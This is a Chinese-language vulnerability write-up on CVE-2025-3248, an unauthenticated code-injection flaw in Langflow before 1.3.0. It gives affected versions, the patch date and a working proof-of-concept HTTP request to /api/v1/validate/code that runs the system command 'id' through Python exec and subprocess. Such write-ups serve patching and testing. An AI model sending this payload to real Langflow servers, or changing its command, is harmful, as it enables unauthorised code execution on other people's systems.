**漏洞介绍**



![图片](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640.png)



Langflow是Langflow开源的一个用于构建多代理和 RAG 应用程序的可视化框架。‌是一个面向开发者的低代码工具，**专注于多智能体人工智能、提示工程和检索增强生成（****RAG****）应用的开发**。它能够帮助开发者轻松构建强大的AI智能体和工作流，通过可视化方式搭建AI应用，通过拖放操作创建复杂的AI工作流，从而降低开发门槛，减少编写样板代码的工作量，使开发者能够更多地专注于创新‌。

Langflow 1.3.0之前版本存在安全漏洞，该漏洞源于/api/v1/validate/code端点存在代码注入漏洞，可能导致远程未经验证的攻击者执行任意代码。

注：2025年4月7日，Langflow AI 发布了补丁，修复了身份认证绕过漏洞。



![Image](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640-1745719765938-1.png)



**0x02影响版本**



langflow<1.3.0

![图片](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640-1745719765938-2.png)

![Image](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640-1745719765938-1.png)



**0x03漏洞复现**

1.访问漏洞环境

![图片](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640-1745719765938-3.png)

2.对漏洞进行复现

 **POC** 

漏洞复现

```yaml
POST /api/v1/validate/code HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 125

{"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n  pass"}
```



   执行命令，通过响应判断漏洞存在。



![图片](Langflow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2025-3248.assets/640-1745719765938-4.png)